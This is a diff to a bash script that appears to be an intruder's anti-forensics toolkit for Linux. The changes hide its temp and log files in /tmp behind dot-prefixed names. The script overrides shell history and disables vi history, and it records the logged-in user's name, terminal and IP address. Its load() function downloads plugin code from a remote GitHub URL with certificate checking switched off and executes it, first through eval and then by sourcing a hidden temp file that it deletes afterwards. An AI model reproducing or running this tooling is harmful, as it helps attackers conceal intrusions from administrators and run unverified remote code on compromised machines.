@@ -16,8 +16,9 @@ export FLAG="#_fdsagadsfasdgadsgsss" #_fdsagadsfasdgadsgsss
 my_name="$(whoami)" #_fdsagadsfasdgadsgsss
 my_pts="$(who am i| awk '{print $2}' | xargs)" #_fdsagadsfasdgadsgsss
 my_ip="$(last | grep "still" |  grep "$my_pts" | awk '{ print $3}' | xargs)" #_fdsagadsfasdgadsgsss
-index_f=/tmp/_fadsgindexfs; #_fdsagadsfasdgadsgsss
-clear_shell=/tmp/asdgsdgdg_log_c; #_fdsagadsfasdgadsgsss
+index_f=/tmp/._fadsgindexfs; #_fdsagadsfasdgadsgsss
+clear_shell=/tmp/.asdgsdgdg_log_c; #_fdsagadsfasdgadsgsss
+load_file=/tmp/.fadsgasdasdg_casdggd; #_fdsagadsfasdgadsgsss
 function _bak { #_fdsagadsfasdgadsgsss
   if [ -f $1 ];then #_fdsagadsfasdgadsgsss
     cp  $1 /tmp/  2>/dev/null #_fdsagadsfasdgadsgsss
@@ -94,7 +95,7 @@ history() { #_fdsagadsfasdgadsgsss
 } #_fdsagadsfasdgadsgsss
 alias vi="vi \"+set history=0\"" #_fdsagadsfasdgadsgsss
 i() { #_fdsagadsfasdgadsgsss
-  for cd_d in $(hist | awk  '{ if ( $1 == "cd"){ print $2};}' | sort | uniq );do #_fdsagadsfasdgadsgsss
+  for cd_d in $(history | awk  '{ if ( $1 == "cd"){ print $2};}' | sort | uniq );do #_fdsagadsfasdgadsgsss
     gglog  ${UNDERLINE}${cd_d}${REST} "to check" #_fdsagadsfasdgadsgsss
   done #_fdsagadsfasdgadsgsss
 } #_fdsagadsfasdgadsgsss
@@ -108,5 +109,5 @@ plist() { #_fdsagadsfasdgadsgsss
 } #_fdsagadsfasdgadsgsss
 load() { #_fdsagadsfasdgadsgsss
   gglog 'load' $1; #_fdsagadsfasdgadsgsss
-  eval "$(wget --no-check-certificate -q 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/plugins/$1' -O-  )" #_fdsagadsfasdgadsgsss
+  wget --no-check-certificate -q 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/plugins/$1' -O-  >  $load_file && if [ -f $load_file ];then source $load_file ; rm $load_file ;fi #_fdsagadsfasdgadsgsss
 } #_fdsagadsfasdgadsgsss
